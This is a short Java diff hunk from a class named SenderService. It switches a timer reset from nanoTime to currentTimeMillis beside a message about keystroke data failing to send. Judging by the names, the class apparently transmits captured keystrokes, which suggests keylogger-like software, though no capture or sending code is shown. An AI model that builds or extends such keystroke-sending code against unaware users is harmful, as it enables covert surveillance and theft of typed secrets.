@@ -62,7 +62,7 @@ public class SenderService implements Runnable {
                     System.out.println("Keystroke data fail to be send.");
                 }
 
-                start = System.nanoTime(); // Reset the timer
+                start = System.currentTimeMillis(); // Reset the timer
             }
         }
     }
